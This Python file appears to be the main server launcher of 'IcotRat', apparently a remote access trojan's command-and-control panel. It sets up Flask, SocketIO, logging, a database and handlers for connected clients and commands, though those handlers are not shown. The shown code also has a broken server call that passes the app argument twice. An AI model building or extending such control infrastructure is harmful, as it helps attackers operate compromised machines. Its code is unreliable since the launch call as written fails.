#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import logging
import colorlog
import argparse
from typing import Tuple
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO
from werkzeug.serving import make_server
import threading
import signal

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import server modules
try:
    from server.database.models import Database
    from server.handlers.client_handler import ClientHandler
    from server.handlers.command_handler import CommandHandler
    from server.admin_panel.routes import register_routes
except ImportError as e:
    print(f"Error importing required modules: {e}")
    sys.exit(1)

class Server:
    """Main server class for IcotRat"""
    
    def __init__(self):
        """Initialize the server components"""
        self.logger = self.setup_logger()
        self.app = self.setup_app()
        self.socketio = SocketIO(self.app, cors_allowed_origins="*")
        self.db = self.setup_database()
        self.client_handler = ClientHandler(self.db, self.logger)
        self.command_handler = CommandHandler(self.client_handler, self.logger)
        self.server = None
        self.shutdown_flag = threading.Event()
        
        # Register routes
        register_routes(self.app, self.socketio, self.client_handler, self.command_handler, self.logger)
    
    def setup_logger(self) -> logging.Logger:
        """Set up the logger with color formatting
        
        Returns:
            Configured logger instance
        """
        handler = colorlog.StreamHandler()
        handler.setFormatter(colorlog.ColoredFormatter(
            '%(log_color)s%(asctime)s [%(levelname)s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S',
            log_colors={
                'DEBUG': 'cyan',
                'INFO': 'green',
                'WARNING': 'yellow',
                'ERROR': 'red',
                'CRITICAL': 'red,bg_white',
            }
        ))
        
        logger = colorlog.getLogger('icotrat')
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)
        return logger
    
    def setup_app(self) -> Flask:
        """Set up the Flask application
        
        Returns:
            Configured Flask app instance
        """
        app_dir = os.path.dirname(__file__)
        app = Flask(
            __name__,
            template_folder=os.path.join(app_dir, 'admin_panel', 'templates'),
            static_folder=os.path.join(app_dir, 'admin_panel', 'static')
        )
        app.config['SECRET_KEY'] = os.urandom(24).hex()
        return app
    
    def setup_database(self) -> Database:
        """Set up the database connection
        
        Returns:
            Database instance
        """
        db_path = os.path.join(os.path.dirname(__file__), 'database', 'icotrat.db')
        try:
            return Database(db_path)
        except Exception as e:
            self.logger.error(f"Failed to initialize database: {e}")
            sys.exit(1)
    
    def parse_arguments(self) -> argparse.Namespace:
        """Parse command line arguments
        
        Returns:
            Parsed arguments
        """
        parser = argparse.ArgumentParser(description='IcotRat Server')
        parser.add_argument('-p', '--port', type=int, default=8080, help='Port to run the server on (default: 8080)')
        parser.add_argument('-H', '--host', type=str, default='0.0.0.0', help='Host to run the server on (default: 0.0.0.0)')
        parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode')
        return parser.parse_args()
    
    def signal_handler(self, signum: int, frame: any) -> None:
        """Handle shutdown signals
        
        Args:
            signum: Signal number
            frame: Current stack frame
        """
        self.logger.info(f"Received signal {signum}, shutting down server...")
        self.shutdown_flag.set()
        if self.server:
            self.server.shutdown()
    
    def run(self) -> None:
        """Run the server"""
        args = self.parse_arguments()
        
        if args.debug:
            self.logger.setLevel(logging.DEBUG)
            self.logger.debug("Debug mode enabled")
        
        # Register signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        try:
            self.logger.info(f"Starting IcotRat server on {args.host}:{args.port}")
            self.server = make_server(
                args.host,
                args.port,
                self.socketio,
                threaded=True,
                app=self.app
            )
            
            # Run server in a separate thread
            server_thread = threading.Thread(target=self.server.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            
            # Wait for shutdown signal
            self.shutdown_flag.wait()
            
        except Exception as e:
            self.logger.error(f"Server error: {e}")
        finally:
            self.cleanup()
    
    def cleanup(self) -> None:
        """Perform cleanup operations"""
        self.logger.info("Performing server cleanup...")
        try:
            if self.db:
                self.db.close()
            if self.server:
                self.server.shutdown()
            self.logger.info("Server shutdown complete")
        except Exception as e:
            self.logger.error(f"Error during cleanup: {e}")

def main() -> None:
    """Main function to start the server"""
    server = Server()
    server.run()

if __name__ == "__main__":
    main()